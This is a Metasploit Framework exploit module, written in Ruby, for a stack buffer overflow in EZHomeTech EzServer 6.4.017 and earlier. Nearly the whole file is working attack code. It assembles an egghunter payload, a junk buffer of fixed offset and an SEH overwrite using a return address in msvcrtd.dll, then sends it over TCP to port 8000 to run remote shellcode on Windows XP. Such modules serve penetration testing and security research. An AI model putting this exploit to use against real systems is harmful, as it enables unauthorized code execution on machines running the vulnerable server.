##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Egghunter
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EZHomeTech EzServer <= 6.4.017 Stack Buffer Overflow Vulnerability',
			'Description'    => %q{
				This module exploits a stack buffer overflow in the EZHomeTech EZServer. If a malicious
				user sends packets containing an overly long string, it may be possible to execute a
				payload remotely. Due to size constraints, this module uses the Egghunter technique.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'modpr0be<modpr0be[at]spentera.com>' # Original discovery and Metasploit module
				],
			'References'     =>
				[
					[ 'EDB', '19266' ],
					[ 'URL', 'http://www.spentera.com/2012/06/ezhometech-ezserver-6-4-017-stack-overflow-vulnerability/' ]
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'seh'
				},
			'Platform'       => 'win',
			'Payload'        =>
				{
					'BadChars' => "\x00\x0a\x0d\x20\x2e\x2f\x3a",
					'DisableNops' => true
				},
			'Targets'        =>
				[
					[ 'EzHomeTech EzServer <= 6.4.017 (Windows XP Universal)',
						{
							'Ret' => 0x10212779, # pop ecx # pop ebx # ret 4 - msvcrtd.dll
							'Offset' =>	5852
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 18 2012',
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(8000)], self.class)

	end

	def exploit
		connect
		eggoptions =
		{
			:checksum => true,
			:eggtag => "w00t"
		}

		hunter = generate_egghunter(payload.encoded,payload_badchars,eggoptions)
		egg = hunter[1]
		buff = rand_text(target['Offset'] - egg.length) #junk
		buff << egg
		buff << make_nops(32)
		buff << generate_seh_record(target.ret)
		buff << make_nops(16)
		buff << hunter[0]
		buff << rand_text_alpha_upper(500)

		print_status("Triggering shellcode now...")
		print_status("Please be patient, the egghunter may take a while..")

		sock.put(buff)

		handler
		disconnect

	end
end